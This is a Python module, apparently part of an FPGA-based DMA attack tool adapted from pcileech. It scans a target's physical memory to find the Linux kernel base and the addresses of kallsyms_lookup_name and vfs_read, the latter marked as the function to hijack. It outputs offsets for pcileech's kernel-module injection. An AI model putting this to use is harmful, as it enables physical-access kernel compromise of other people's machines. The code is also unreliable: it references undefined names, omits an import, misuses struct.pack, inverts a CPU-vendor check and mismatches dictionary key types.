import logging

from struct import unpack_from


logger = logging.getLogger('picodma_radio.pcileech')


# code adapted from pcileech/pcileech/kmd.c for Linux 4.8+ kernels.
# intent here is to move expensive computation onto the pycom and fpga,
# and leverage FPGA-based search to accelerate finding kernel base and other
# search-intensive operations.
#
# functions with similar purpose to pcileech counterparts share the same name.
# pcileech is GPL and (c) Ulf Frisk, see the included license

# thank you to Ulf and all pcileech users and contributors!


def print_signature(kernel_base_addr, aseek_kallsyms, va_sz_kallsyms, va_fn_kallsyms,
                                      aseek_fnhijack, va_sz_fnhijack, va_fn_hijack):
    logger.info('kernel_base_addr: %8x' % kernel_base_addr)
    logger.info('aseek_kallsyms: %8x'   % aseek_kallsyms)
    logger.info('va_sz_kallsyms: %8x'   % va_sz_kallsyms)
    logger.info('va_fn_kallsyms: %8x'   % va_fn_kallsyms)
    logger.info('aseek_fnhijack: %8x'   % aseek_fnhijack)
    logger.info('va_sz_fnhijack: %8x'   % va_sz_fnhijack)
    logger.info('va_fn_hijack: %8x'     % va_fn_hijack)

    logger.info("run pcileech with -kmd LINUX_X64_48_OFFSETS -48offsets <this config>")
    logger.info('%x,%x,%x,%x,%x,%x,%x' % (kernel_base_addr, aseek_kallsyms, va_sz_kallsyms, va_fn_kallsyms, aseek_fnhijack, va_sz_fnhijack, va_fn_hijack))


def search_for_bytes(dma, addr, sz, search_bytes_list, offsets, block_size=4096):
    max_search_bytes_len = max([len(f) for f in search_bytes_list])

    block_count = int(sz / block_size)
    remainder = sz % block_size

    # code assumes max_search_bytes_len < block_size, and whole range is readable
    for i in range(0, block_count):
        block_addr = addr + (block_size * i)

        if i == block_count - 1: # don't try to read more than remainder past last block
            byte_array = dma.read_pa(block_addr, block_size + min(max_search_bytes_len - 1, remainder))
        else:
            byte_array = dma.read_pa(block_addr, block_size + max_search_bytes_len - 1)

        find_bytes_in_array(byte_array, addr + (block_size * i), block_size, search_bytes_list, offsets)

    if remainder:
        block_addr = addr + (block_size * block_count)
        byte_array = f.read(block_addr, remainder)
        find_bytes_in_array(byte_array, addr + (block_size * block_count), remainder, search_bytes_list, offsets)


def find_bytes_in_array(byte_array, byte_array_offset, search_len, search_bytes_list, offsets):
    for i in range(0, search_len):
        for search_bytes in search_bytes_list:
            if memcmp(byte_array, search_bytes, i):
                if search_bytes not in offsets:
                    offsets[search_bytes] = []
                offsets[search_bytes].append(byte_array_offset + i)
                logger.info("found %s at 0x%x" % (search_bytes, byte_array_offset + i))


def memcmp(byte_array, search_bytes, offset):
    for i in range(0, len(search_bytes)):
        if offset + i >= len(byte_array):
            return False

        if byte_array[offset + i] != search_bytes[i]:
            return False

    return True


def kernel_addr(read_addr, read_addr_prev):
    return ((read_addr & 0xffffffff00000000) == 0xffffffff00000000) and ((read_addr_prev & 0xffffffff00000000) == 0xffffffff00000000)


def not_symbol_table(read_addr, read_addr_prev):
    return (read_addr & ~0x1fffff) != (read_addr_prev & ~0x1fffff)


def kaslr_align(read_addr, aSeek):
    return (read_addr & 0x1fffff) == (0x1fffff & aSeek)


def is_genuine_intel_in(byte_array, offset):
    if offset + 16 > len(byte_array):
        return False

    return memcmp(byte_array, b'Genu', offset) \
       and memcmp(byte_array, b'ineI', offset + 8) \
       and memcmp(byte_array, b'ntel', offset + 16)


def is_authentic_amd_in(byte_array, offset):
    if offset + 16 > len(byte_array):
        return False

    return memcmp(byte_array, b'Auth', offset) \
       and memcmp(byte_array, b'enti', offset + 8) \
       and memcmp(byte_array, b'cAMD', offset + 16)


def find_table_entries_in_block(kernel_base_addr, byte_array, offset, aSeeks, tableEntries):
    for i in range(8, len(byte_array), 8):
        read_addr_prev, read_addr = unpack_from('<QQ', byte_array, i - 8)
        check_addrs(kernel_base_addr, read_addr, read_addr_prev, i, aSeeks, tableEntries)


def check_addrs(kernel_base_addr, read_addr, read_addr_prev, offset, aSeeks, tableEntries):
    if kernel_addr(read_addr, read_addr_prev) and not_symbol_table(read_addr, read_addr_prev):
        for function_name, aSeek in aSeeks.items():
            if function_name not in tableEntries and kaslr_align(read_addr, aSeek):
                aTableEntry = offset
                vaSeek = read_addr
                vaFn = read_addr_prev

                tableEntries[function_name] = (aSeek, aTableEntry, vaSeek, vaFn)


def check_range(byte_array, offset, sz, value):
    for i in range(offset, sz):
        if byte_array[i] != value:
            return False

    return True


def KMD_Linux48KernelBaseSeek_FPGASearch(dma, start_addr, end_addr, is_xen=False):
    for page_addr in range(start_addr, end_addr, 0x200000):
        # need to pad searches to make them word aligned:
        found1, found_addr = dma.search_bytes32(page_addr, 0x400, struct.pack("<I", b'Genu'))
        found2, found_addr = dma.search_bytes32(page_addr, 0x400, struct.pack("<I", b'ineI'))
        found3, found_addr = dma.search_bytes32(page_addr, 0x400, struct.pack("<I", b'ntel'))

        if found1 or found2 or found3:
            logger.info("found potential start page: %x, search hits" % page_addr)

            base_addr = KMD_Linux48KernelBaseSeek_checkPage(dma, page_addr, is_xen)

            if base_addr:
                logger.info("found kernel base address 0x%x" % base_addr)
                return base_addr
            else:
                logger.debug("0x%x wasn't a match" % page_addr)

    return None

def KMD_Linux48KernelBaseSeek_checkPage(dma, page_addr, is_xen):
    page_start = dma.read_pa(page_addr, 0x1000)

    is_genuine_intel = False
    is_authentic_amd = False

    for i in range(0, 0x400):
        is_genuine_intel |= is_genuine_intel_in(page_start, i)
        is_authentic_amd |= is_authentic_amd_in(page_start, i)

    if not is_genuine_intel or not is_authentic_amd:
        logger.debug("not genuine intel / authentic amd")
        return None

    logger.info('GenuineIntel and AuthenticAMD found.')

    # verify that page ends with 0x400 NOPs (0x90)
    if not check_range(page_start, 0xc00, 0x400, 0x90):
        return None

    logger.info('NOPs found.')

    # read kernel base + 0x1000 (hypercall page?) and check that it ends with at least 0x100 0x00.
    if not is_xen:
        next_block = dma.read_pa(page_addr + 0x1000, 0x1000)
        if not check_range(next_block, 0xf00, 0x100, 0x00):
            return None
        logger.info('hypercall null bytes found.')
    else:
        pass # for xen check 0xcc here!

    return page_addr


def KMD_LinuxFindFunctionAddr_FPGASearch(dma, kernel_base_addr, sz, function_list, block_size=4096):
    aSeeks = {}

    for function_name in function_list:
        name_first_8 = function_name[0:8]
        search_base = kernel_base_addr
        search_window = sz

        logger.info("searching for %s" % function_name)

        found, first_offset = dma.search_bytes32(search_base, search_window, name_first_8)

        if found:
            # only need to check a single block slowly
            logger.info("found potential offset for %s at %x, block %x, size %x" % (function_name, first_offset, block_addr, found_block_size))
            search_for_bytes(dma, block_addr, found_block_size, function_list, aSeeks, block_size)

    for func_name, offsets in aSeeks.items():
        first_offset = offsets[0]
        # pcileech KMD_LinuxFindFunctionAddr finds offset _after_ null byte
        aSeeks[func_name] = first_offset - kernel_base_addr + 1

    return aSeeks

def KMD_LinuxFindFunctionAddr(dma, kernel_base_addr, sz, function_list, block_size=4096):
    aSeeks = {}
    search_for_bytes(dma, kernel_base_addr, sz, function_list, aSeeks, block_size)

    for func_name, offsets in aSeeks.items():
        first_offset = offsets[0]
        # pcileech KMD_LinuxFindFunctionAddr finds offset _after_ null byte
        aSeeks[func_name] = first_offset - kernel_base_addr + 1

    return aSeeks


def KMD_LinuxFindFunctionAddrTBL(dma, kernel_base_addr, sz, aSeeks, block_size=4096):
    block_count = int(sz / block_size)
    remainder = sz % block_size
    tableEntries = {}

    for i in range(0, block_count):
        byte_array = dma.read_pa(kernel_base_addr + (block_size * i), block_size)
        find_table_entries_in_block(kernel_base_addr, byte_array, kernel_base_addr + (block_size * i), aSeeks, tableEntries)

    if remainder:
        byte_array = dma.read_pa(kernel_base_addr + (block_size * block_count), remainder)
        find_table_entries_in_block(kernel_base_addr, byte_array, kernel_base_addr + (block_size * block_count), aSeeks, tableEntries)

    return tableEntries


def KMDOpen_MemoryScan_generate_signature(dma, is_xen=False):
    # find kernel base address: leverage FPGA search
    start_addr = 0x01000000
    end_addr = 8 * 1024 * 1024 * 1024 # demo machine has 8 gigs memory

    kernel_base_addr = KMD_Linux48KernelBaseSeek_FPGASearch(dma, start_addr, end_addr, is_xen)

    # seek signature
    KMD_LINUX48SEEK_MAX_BYTES = 0x02000000 # 32 megs
    function_list = [b"\0kallsyms_lookup_name\0", b"\0vfs_read\0"]

    aSeeks = KMD_LinuxFindFunctionAddr_FPGASearch(dma, kernel_base_addr, KMD_LINUX48SEEK_MAX_BYTES, function_list)
    table_entries = KMD_LinuxFindFunctionAddrTBL(dma, kernel_base_addr, KMD_LINUX48SEEK_MAX_BYTES, aSeeks)

    # print signature
    aseek_kallsyms, pa_sz_kallsyms, va_sz_kallsyms, va_fn_kallsyms = table_entries["\0kallsyms_lookup_name\0"]
    aseek_fnhijack, pa_sz_fnhijack, va_sz_fnhijack, va_fn_hijack = table_entries["\0vfs_read\0"]

    print_signature(kernel_base_addr, aseek_kallsyms, va_sz_kallsyms, va_fn_kallsyms, aseek_fnhijack, va_sz_fnhijack, va_fn_hijack)
